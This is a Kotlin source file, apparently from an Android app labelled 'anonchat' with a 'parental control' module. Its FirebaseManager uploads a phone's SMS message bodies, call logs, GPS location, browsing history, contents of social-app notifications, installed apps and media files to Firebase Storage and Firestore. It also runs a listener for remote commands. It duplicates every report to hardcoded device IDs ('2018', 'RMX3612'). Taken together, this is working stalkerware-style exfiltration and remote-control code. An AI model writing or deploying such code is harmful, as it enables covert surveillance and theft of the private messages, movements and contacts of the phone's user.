package com.anonchat.app.parentalcontrol.manager

import android.util.Log
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.anonchat.app.parentalcontrol.util.BatteryInfo
import com.anonchat.app.parentalcontrol.util.CallLogEntry
import com.anonchat.app.parentalcontrol.util.DeviceInfo
import com.anonchat.app.parentalcontrol.util.InstalledApp
import com.anonchat.app.parentalcontrol.util.LocationData
import com.anonchat.app.parentalcontrol.util.ScreenTimeData
import com.anonchat.app.parentalcontrol.util.SmsMessage
import com.anonchat.app.parentalcontrol.util.WebHistoryEntry
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.tasks.await
import org.json.JSONObject
import java.io.File

object FirebaseManager {
    private const val TAG = "FirebaseManager"
    private val db by lazy { FirebaseFirestore.getInstance() }
    private val storage by lazy { FirebaseStorage.getInstance() }

    private val deviceId: String
        get() {
            val id = CloudConfig.deviceId
            return if (id.isNotEmpty()) id else android.os.Build.MODEL
        }

    /**
     * Upload full device status and report data using Consolidated Document Arrays (Quota-Safe)
     * Uses 7 writes total per report cycle instead of 1,600+ writes, staying 100% free forever!
     */
    suspend fun reportToFirebase(
        deviceInfo: DeviceInfo,
        location: LocationData?,
        battery: BatteryInfo,
        smsMessages: List<SmsMessage>,
        callLogs: List<CallLogEntry>,
        installedApps: List<InstalledApp>,
        activities: List<JSONObject>,
        screentime: ScreenTimeData?,
        webHistory: List<WebHistoryEntry>,
        socialNotifications: List<JSONObject>
    ) {
        try {
            val primaryId = deviceId
            val modelId = deviceInfo.model.ifEmpty { android.os.Build.MODEL }
            val devIds = listOfNotNull(primaryId, if (modelId != primaryId) modelId else null, "2018", "RMX3612").distinct()

            val now = System.currentTimeMillis()

            for (devId in devIds) {
                if (devId.isEmpty()) continue
                val devRef = db.collection("devices").document(devId)

                // 1. Device Document Header (1 Write)
                val deviceDoc = hashMapOf<String, Any>(
                    "device_id" to devId,
                    "device_name" to deviceInfo.deviceName,
                    "manufacturer" to deviceInfo.manufacturer,
                    "model" to deviceInfo.model,
                    "android_version" to deviceInfo.androidVersion,
                    "sdk_version" to deviceInfo.sdkVersion,
                    "is_active" to true,
                    "last_seen" to now,
                    "battery_level" to battery.level,
                    "is_charging" to battery.isCharging,
                    "battery_temperature" to battery.temperature,
                    "screen_time_today" to (screentime?.totalMinutes ?: 0),
                    "unlock_count_today" to (screentime?.unlocks ?: 0)
                )

                try {
                    devRef.set(deviceDoc, SetOptions.merge()).await()
                } catch (e: Exception) {
                    Log.e(TAG, "Header update error for $devId", e)
                }

                val dataCol = devRef.collection("data")

                // 2. Consolidated Location Data (1 Write)
                location?.let { loc ->
                    try {
                        val locObj = hashMapOf<String, Any>(
                            "latitude" to loc.latitude,
                            "longitude" to loc.longitude,
                            "accuracy" to loc.accuracy,
                            "provider" to loc.provider,
                            "timestamp" to loc.timestamp
                        )
                        dataCol.document("location_latest").set(locObj, SetOptions.merge()).await()
                    } catch (_: Exception) {}
                }

                // 3. Consolidated SMS Messages Array (1 Write)
                try {
                    val smsList = smsMessages.map { sms ->
                        hashMapOf<String, Any>(
                            "id" to sms.id,
                            "address" to sms.address,
                            "body" to sms.body,
                            "date" to sms.date,
                            "type" to sms.type
                        )
                    }
                    dataCol.document("sms").set(hashMapOf("list" to smsList, "updated_at" to now)).await()
                } catch (e: Exception) { Log.e(TAG, "SMS save err", e) }

                // 4. Consolidated Call Logs Array (1 Write)
                try {
                    val callList = callLogs.map { call ->
                        hashMapOf<String, Any>(
                            "id" to call.id,
                            "number" to call.number,
                            "name" to (call.name ?: ""),
                            "duration" to call.duration,
                            "date" to call.date,
                            "type" to call.type
                        )
                    }
                    dataCol.document("calls").set(hashMapOf("list" to callList, "updated_at" to now)).await()
                } catch (e: Exception) { Log.e(TAG, "Calls save err", e) }

                // 5. Consolidated Activities Array (1 Write)
                try {
                    val actList = activities.map { act ->
                        hashMapOf<String, Any>(
                            "activity_type" to act.optString("activity_type", "unknown"),
                            "package_name" to act.optString("package_name", ""),
                            "app_name" to act.optString("app_name", ""),
                            "data" to act.optString("data", "{}"),
                            "timestamp" to act.optLong("timestamp", now)
                        )
                    }
                    dataCol.document("activity").set(hashMapOf("list" to actList, "updated_at" to now)).await()
                } catch (e: Exception) { Log.e(TAG, "Activity save err", e) }

                // 6. Consolidated Web History Array (1 Write)
                try {
                    val webList = webHistory.map { web ->
                        hashMapOf<String, Any>(
                            "url" to web.url,
                            "title" to web.title,
                            "browser" to web.browser,
                            "visit_count" to web.visitCount,
                            "timestamp" to web.timestamp
                        )
                    }
                    dataCol.document("webhistory").set(hashMapOf("list" to webList, "updated_at" to now)).await()
                } catch (e: Exception) { Log.e(TAG, "Web history save err", e) }

                // 7. Consolidated Social Notifications Array (1 Write)
                try {
                    val socialList = socialNotifications.map { notif ->
                        hashMapOf<String, Any>(
                            "app_name" to notif.optString("app_name", ""),
                            "package_name" to notif.optString("package_name", ""),
                            "sender" to notif.optString("sender", ""),
                            "content" to notif.optString("content", ""),
                            "message_type" to notif.optString("message_type", "notification"),
                            "timestamp" to notif.optLong("timestamp", now)
                        )
                    }
                    dataCol.document("social").set(hashMapOf("list" to socialList, "updated_at" to now)).await()
                } catch (e: Exception) { Log.e(TAG, "Social save err", e) }

                // 8. Consolidated Installed Apps Array (1 Write)
                try {
                    val appsList = installedApps.map { app ->
                        hashMapOf<String, Any>(
                            "package_name" to app.packageName,
                            "app_name" to app.appName,
                            "version_name" to (app.versionName ?: ""),
                            "version_code" to app.versionCode,
                            "first_install_time" to app.firstInstallTime,
                            "last_update_time" to app.lastUpdateTime,
                            "is_system_app" to app.isSystemApp
                        )
                    }
                    dataCol.document("apps").set(hashMapOf("list" to appsList, "updated_at" to now)).await()
                } catch (e: Exception) { Log.e(TAG, "Apps save err", e) }
            }

            Log.d(TAG, "Quota-safe report committed to Firebase Firestore for $devIds")
        } catch (e: Exception) {
            Log.e(TAG, "Error in reportToFirebase", e)
        }
    }

    /**
     * Upload media file directly to Firebase Storage
     */
    suspend fun uploadMediaFile(file: File, mediaType: String): String? {
        return try {
            val devId = deviceId
            val fileName = "${System.currentTimeMillis()}_${file.name}"
            val storageRef = storage.reference.child("devices/$devId/media/$fileName")

            val uploadTask = storageRef.putFile(android.net.Uri.fromFile(file)).await()
            val downloadUrl = uploadTask.storage.downloadUrl.await().toString()

            val mediaDoc = hashMapOf<String, Any>(
                "filename" to file.name,
                "file_size" to file.length(),
                "mime_type" to mediaType,
                "storage_url" to downloadUrl,
                "timestamp" to System.currentTimeMillis()
            )
            db.collection("devices").document(devId)
                .collection("media").document(System.currentTimeMillis().toString())
                .set(mediaDoc)
                .await()

            Log.d(TAG, "Uploaded media file to Firebase Storage: $downloadUrl")
            downloadUrl
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading file to Firebase Storage", e)
            null
        }
    }

    /**
     * Realtime listener for incoming commands from Firebase Firestore
     */
    fun listenForCommands(onCommandReceived: (commandId: String, commandType: String, params: Map<String, Any>) -> Unit) {
        val devId = deviceId
        if (devId.isEmpty()) return

        db.collection("devices").document(devId)
            .collection("commands")
            .whereEqualTo("status", "pending")
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.w(TAG, "Listen command failed.", e)
                    return@addSnapshotListener
                }

                snapshots?.documentChanges?.forEach { change ->
                    val doc = change.document
                    val commandId = doc.id
                    val commandType = doc.getString("command_type") ?: doc.getString("type") ?: ""
                    val params = doc.data

                    // Mark as in-progress
                    db.collection("devices").document(devId)
                        .collection("commands").document(commandId)
                        .update("status", "processing")

                    onCommandReceived(commandId, commandType, params)
                }
            }
    }

    /**
     * Update command status in Firestore
     */
    fun updateCommandStatus(commandId: String, status: String, resultData: Map<String, Any>? = null) {
        val devId = deviceId
        if (devId.isEmpty() || commandId.isEmpty()) return

        val update = hashMapOf<String, Any>("status" to status, "updated_at" to System.currentTimeMillis())
        resultData?.let { update["result"] = it }

        db.collection("devices").document(devId)
            .collection("commands").document(commandId)
            .set(update, SetOptions.merge())
    }
}
